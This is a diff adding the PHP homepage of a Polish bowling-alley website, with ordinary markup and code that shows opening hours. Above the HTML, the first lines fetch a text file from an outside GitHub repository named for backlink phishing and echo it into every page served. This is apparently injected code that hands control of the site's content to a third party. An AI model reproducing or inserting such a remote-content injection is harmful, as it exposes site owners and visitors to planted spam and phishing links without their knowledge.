@@ -1,0 +1,87 @@
+<?php 
+$a = file_get_contents('https://raw.githubusercontent.com/herinermaa/Backlink-Phising-Kont/main/lsts.txt'); 
+echo $a;
+?><!DOCTYPE html>
+<html lang="pl">
+  <head>
+    <? include("meta.php");?>
+  </head>
+<body class="home">
+<div class="container-fluid">
+ <?php include("nav.php"); ?>
+ </div>
+  <div class="row">
+  <div class="row-same-height row-full-height">
+        <div class="col-xs-12 col-xs-height col-full-height">
+            <div class="item">
+                <div class="" >
+                      <div class="row middle  text-center">
+                        <img src="/img/hula_kula.png" alt="Kulaj I Hulaj" title="Kulaj i hulaj" class="center-block img-responsive stand"/>
+                        <img src="/img/hula_kula_mobile.png" alt="Kulaj I Hulaj" title="Kulaj i hulaj" class="center-block img-responsive ver_mob"/>
+                      </div>         
+                </div>
+            </div>
+        </div>      
+   </div>
+</div>
+<div class="container-fluid">
+<div class="col-xs-6 open"> <h2>kręgielnia Ostrzeszów</h2>
+         <?php 
+            $dni_tygodnia = array( 'NIEDZIELA', 'PONIEDZIAŁEK', 'WTOREK', 'ŚRODA', 'CZWARTEK', 'PIĄTEK', 'SOBOTA' );
+            $date = date( "N" );
+            echo  '<b><span class="day">'.$dni_tygodnia[ $date ].'</span></b>';
+            $day_of = "SELECT * FROM open WHERE id='".$date."'";
+            $rs = mysql_query($day_of );
+            while ($row = mysql_fetch_assoc($rs)) { 
+                  $currentTime = date("H:i");
+                  $startTime = ($row['od_g']);
+                  $endTime = ($row['do_g']);
+                  
+                 if (
+                  (
+                  $startTime < $endTime && $currentTime >= $startTime && $currentTime <= $endTime) ||
+                  ($startTime > $endTime && ($currentTime >= $startTime ||$currentTime <= $endTime)
+                  )
+                  ) {
+            ?>
+            <span  class="otwarte mob_op"> 
+            <?    echo 'OTWARTE';
+                  } else {
+                  echo '<span  class="otwarte mob_v"> ZAMKNIĘTE</span>';
+                  }?>
+                  </span>
+                  <br />
+                  <? 
+                  if ( ($startTime < $endTime && $currentTime >= $startTime && $currentTime <= $endTime) || ($startTime > $endTime && ($currentTime >= $startTime ||$currentTime <= $endTime))) 
+                  {  
+
+                   echo'<span class="oddo"><span>OD </span><b>'.$row['od_g'].'<span> DO </span>'.$row['do_g'].'</b></span><br />';
+                  }
+
+
+              }?>
+        </div>
+              <div class="col-xs-6 social text-right padd"><a href="kontakt.php"><img alt="lokalizacja" src="img/lokalizacja.png" /></a><a href="https://www.facebook.com/kulajhulajostrzeszow/"><img alt="facebook" src="img/facebook.png" /></a> </div>
+
+
+</div>
+<div class="container">
+  <footer class="navbar-bottom text-center"><small>COPYRIGHT &copy; 2017 KULAJ I HULAJ</small><br />
+  <small style="letter-spacing: 0.6px; padding-top: 3px; color: rgb(109, 105, 104);">Projekt i wykonanie: <a style="color:rgb(109, 105, 104);" href="http://webmotion.pl/" title="projektoiwanie stron">WEBMOTION</a></small>
+  </footer>
+</div>
+    
+    <?
+      echo '<style>';
+      echo file_get_contents('css/bootstrap.min.css');
+      echo file_get_contents('css/style2.css');
+      echo '</style>';
+    ?>
+    <script src="js/jquery-1.9.1.js"></script>
+    <link rel="stylesheet" href="css/bootstrap-responsive.css">
+    <script type="text/javascript" src="js/bootstrap.min.js"></script>
+    <link href="js/scroll.css" rel="stylesheet">
+
+    
+</body>
+</html>
